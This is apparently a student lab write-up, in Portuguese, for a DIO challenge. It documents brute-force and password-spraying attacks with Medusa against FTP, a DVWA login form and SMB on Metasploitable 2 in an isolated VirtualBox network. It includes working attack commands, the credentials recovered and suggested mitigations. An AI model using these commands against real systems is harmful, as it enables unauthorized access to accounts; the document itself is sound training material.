# Medusa-Kali
Desafio DIO: Força Bruta com Kali Linux e Medusa
Esse modelo cobre:

* Introdução e contexto
* Estrutura do ambiente (com topologia)
* Ataques realizados: FTP, DVWA (formulário web), SMB
* Comandos utilizados
* Wordlists
* Resultados e capturas de tela (use a pasta `/images`)
* Mitigações sugeridas
* Conclusão

Este repositório documenta o projeto prático proposto no desafio da DIO, focando na simulação de ataques de força bruta em ambientes controlados utilizando as ferramentas Kali Linux, Medusa e máquinas vulneráveis como Metasploitable 2 e DVWA. O objetivo é compreender vulnerabilidades comuns, testar autenticações inseguras e propor boas práticas de segurança.

Objetivos

* Compreender o funcionamento de ataques de força bruta em diferentes serviços (FTP, Web, SMB).
* Configurar e utilizar o Medusa para automatizar tentativas de autenticação.
* Documentar processos técnicos de forma clara e estruturada.
* Propor medidas de mitigação realistas e eficazes.
* Utilizar o GitHub como portfólio técnico.

Ambiente de Testes

| Componente  | Descrição                                   |
| ----------- | ------------------------------------------- |
| Host        | Kali Linux (VM)                             |
| Alvo        | Metasploitable 2 + DVWA (VM)                |
| Rede        | Host-Only (VirtualBox)                      |
| Ferramentas | Medusa, curl, Hydra (opcional), rockyou.txt |

Topologia:


[ Kali Linux ] ←(Host-only)→ [ Metasploitable 2 + DVWA ]



Ataques Realizados

1.Ataque FTP com Medusa

Comando:

medusa -h 192.168.56.105 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ftp

Explicação:

* `-h`: IP do alvo
* `-u`: usuário
* `-P`: caminho da wordlist
* `-M`: módulo (FTP)

Resultado:
Credenciais descobertas: `msfadmin:msfadmin`
Acesso validado via `ftp`.

2. Força Bruta em Formulário Web (DVWA)

Pré-requisitos:
Configurar DVWA para **segurança: LOW

Comando com Medusa:

medusa -h 192.168.56.105 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m FORM \
  -e ns -T 5 -w 5 -b -f \
  -m DIR:/dvwa/login.php -m FORM:username=^USER^&password=^PASS^&Login=Login \
  -m DENY:"Login failed"

Explicação:

* Ataque no formulário de login da DVWA
* O parâmetro `DENY` identifica falhas com base na resposta da página

Resultado:
Login com senha válida foi identificado.

3.Password Spraying no SMB com Enum4Linux

Etapa 1: Enumeração de usuários


enum4linux -U 192.168.56.105


Etapa 2: Ataque SMB


medusa -h 192.168.56.101 -U users.txt -P rockyou.txt -M smbnt


Resultado:
Acesso obtido via SMB com usuário válido



Wordlists

Utilizada a wordlist **rockyou.txt**, já inclusa no Kali Linux, que conta com vários parâmetros sem a necessidade real de criar uma lista ampla:


/usr/share/wordlists/rockyou.txt


Obs: execute `gunzip rockyou.txt.gz` se necessário.



Evidências (Capturas de Tela)

As capturas estão na pasta [`/images`](./images):

`ftp_attack.png`
`dvwa_attack.png`
`smb_enum.png`
`success_login.png`

Recomendações de Mitigação

* Desabilitar serviços desnecessários (ex: FTP, Telnet).
* Aplicar bloqueios temporários após múltiplas tentativas falhas (ex: fail2ban).
* Implementar autenticação multifator (MFA).
* Utilizar senhas fortes e complexas, evitando padrões comuns.
* Atualizar e monitorar logs de autenticação regularmente.

Conclusão

Este projeto demonstrou, em um ambiente controlado, como ferramentas de ataque como o Medusa podem ser utilizadas para testar a segurança de serviços vulneráveis. A experimentação com wordlists e diferentes protocolos mostrou a importância da boa gestão de senhas, mitigações ativas contra ataques automatizados e que treinamento de pessoal com uma politica de seginfo bem estruturada ainda assim pode não ser suficiente para conter incidentes, mas diminui a probabilidade de sucesso de um ataque.

Referências

* [Kali Linux Tools](https://tools.kali.org/)
* [Medusa GitHub](https://github.com/jmk-foofus/medusa)
* [DVWA GitHub](https://github.com/digininja/DVWA)
* [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
* [rockyou.txt wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)



Autor

Carlos Eduardo Silva Bertazzoli
Projeto desenvolvido para o desafio da [Digital Innovation One (DIO)](https://www.dio.me)

